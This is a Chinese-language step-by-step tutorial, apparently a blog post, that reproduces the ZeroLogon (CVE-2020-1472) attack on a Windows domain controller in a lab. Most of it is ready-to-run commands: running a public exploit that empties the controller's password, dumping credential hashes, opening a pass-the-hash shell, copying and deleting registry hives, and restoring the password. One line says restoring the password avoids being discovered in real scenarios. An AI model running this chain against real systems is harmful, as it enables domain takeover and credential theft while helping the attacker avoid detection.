# CVE-2020-1472 ZeroLogon特权提升漏洞

<font color=green>**注意事项：该过程可能会对域环境造成影响，请勿在生产环境复现**</font>

### 一、漏洞简介：

> NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口,被用于各种与用户和机器认证相关的任务。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码微软MSRC于8月11日 发布了Netlogon 特权提升漏洞安全通告。此漏洞CVE编号CVE-2020-1472， CVSS 评分:10.0。由 Secura 公司的 Tom Tervoort 发现提交并命名为 **ZeroLogon**；
> 攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的 Netlogon 安全通道时，存在特权提升漏洞。当成功利用此漏洞时，攻击者可无需通过身份验证，在网络中的设备上运行经特殊设计的应用程序，获取域控制器的管理员权限。

### 二、影响范围：

> Windows Server 2012 (Server Core installation)
> 
> Windows Server 2012 R2
> 
> Windows Server 2012 R2 (Server Core installation)
> 
> Windows Server 2016
> 
> Windows Server 2016 (Server Core installation)
> 
> Windows Server 2019
> 
> Windows Server 2019 (Server Core installation)
> 
> Windows Server, version 1903 (Server Core installation)
> 
> Windows Server, version 1909 (Server Core installation)

### 三、需要的环境：

> 1、搭建一个简单的域环境，此处使用Windows Server 2012 R2；不会的可参考
> 
> https://blog.csdn.net/wwl012345/article/details/88934571
> 
> 2、Python环境 最好是python3
> 
> 3、安装Impacket工具包；可参考https://www.freebuf.com/sectool/175208.html
> 
> 4、EXP&POC
> 
> https://github.com/dirkjanm/CVE-2020-1472.git (EXP)
> 
> https://github.com/SecuraBV/CVE-2020-1472.git (POC)

### 四、复现过程：

> 搭建域环境->安装impacket工具包->下载POC及EXP->利用POC检测是否可利用->利用EXP置空域控密码->获得用户hash->通过hash取得一个shell->获得机器保存的原hash->通过获得的hash恢复置空域控密码

---

#### 1.1、Kali安装pip3:

```bash
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python3 get-pip.py
```

#### 1.2、下载安装Impacket工具包：

```bash
git clone https://github.com/SecureAuthCorp/impacket.gitcd /impacket
python3 setup.py install
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgFKfx7Irp7dHNWpEsmGYtzia0kZUVaQ0dvMqOKRK3POs1vwx0j9b5aZw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.3、下载POC&EXP：

```bash
git clone https://github.com/SecuraBV/CVE-2020-1472.git  CVE-2020-1472_POC
git clone https://github.com/dirkjanm/CVE-2020-1472.git  CVE-2020-1472_EXP
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgM7nILWrqa23ThGiaPvD0Qd5XUMtRmvdSSthL9yHOiaTov0HzCtS7N4NQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgJb9wv22XXbcxcaMZI0hSKmJg4BDicZQjkjH3SJEBbUNgHBabggq2vtw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.4、利用POC检测：

```bash
cd /root/github/CVE-2020-1472_POC
python3 zerologon_tester.py WIN-C6LETGR17RK 192.168.5.132
```

![图片](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143639.png)

![图片](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143640.png)

#### <font color=red>1.5、利用EXP获取域控存储的hash：</font>

```
1.将域控密码置为空密码：
cd /root/github/CVE-2020-1472_EXP
python3 cve-2020-1472-exploit.py WIN-C6LETGR17RK(这是域控主机名) 192.168.5.132(这是域控ip)
2.获得域控上的hash：
cd /root/github/impacket/examples
python3 secretsdump.py tbosec.com/WIN-C6LETGR17RK\$@192.168.5.132 -no-pass
上面是 域名/域控主机名\$@域控ip
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgoIRVC0Fy0p1wqmDUABnkoBaiacz07Nb5P476fBv6eLIJUJAwjrshXYg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhg1jnXp856QZA58R8aFIyhbzpcic4NLgwoJgm1Rv6IwWGaYMxQZQbibKyg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.6、使用hash登录域控：

```
cd /root/github/impacket/examples
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36a06e6257a0e2c2b0bb3673f6297df7 administrator@192.168.5.132
或者；建议使用👇
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36a06e6257a0e2c2b0bb3673f6297df7 tbosec.com/administrator@192.168.5.132
```

![图片](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143641)

#### 1.7、恢复域控密码：

**后面这几步非必须，但真实场景中避免影响正常业务或被发现可以恢复域控密码**

```
参考方法：
https://github.com/risksense/zerologon
1.导出sam等文件到本地，获得域控上边本地保存的置空前的hash
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save
```

![图片](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143641.png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhg0hicLeRqse3MiazibrMy6qt70ZiaNDbzlmibFatEUatHl5pFcP2f8nZKMYQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.8、通过sam等文件获得原ntlm hash：

```
cd /root/github/impacket/examples
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgszo0lLa0EZXmmIHYw2mnJIhlSpwFmofViaicy85A4DcPHjpqXstgo04w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.9、恢复原hash：

```
git clone https://github.com/risksense/zerologon.git
cd zerologon
python3 reinstall_original_pw.py WIN-7JMG7PQ1LL8(域控主机名) 192.168.5.132 f9bca1e49fbfb7fec5fc54d80c72a79c(这是上面红框的后半部分)
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgSrYibZGYe5PWwgF6CibzFsibeUYIY9g43icpPzqp2ibwpGVn9KA8DXOwySw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2.0、确认是否恢复成功：

**再次尝试获取hash已经不能成功了，成功恢复**

![图片](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143642.png)

#### 最后：

------

如果过程出现部分错误，可参考下面的帖子，前人已整理出来

http://0x3.biz/archives/1960.html
